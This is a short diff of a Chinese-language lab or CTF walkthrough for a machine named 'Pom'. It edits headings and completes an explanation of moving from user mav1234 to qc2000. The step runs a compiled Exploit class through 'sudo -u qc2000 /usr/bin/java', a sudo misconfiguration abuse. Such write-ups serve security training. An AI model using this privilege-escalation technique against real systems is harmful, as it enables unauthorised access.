@@ -462,7 +462,7 @@ mav1234@Pom:~$ ls
 journel   user.txt
 ```
 ok,shell稳定了。
-# mav1234用户信息收集
+# mav1234 ---> qc2000
 ```bash
 mav1234@Pom:/home$ sudo -l
 
@@ -510,4 +510,5 @@ Exploit.class       Exploit.java        hsperfdata_mav1234
 mav1234@Pom:/tmp$ sudo -u qc2000 /usr/bin/java -cp /tmp Exploit
 qc2000@Pom:/tmp$
 ```
- 因为是以`qc2000`yon
+ 因为是以`qc2000`用户权限运行的，所以的到了该用户的权限。横向移动成功
+# qc2000 ---> 
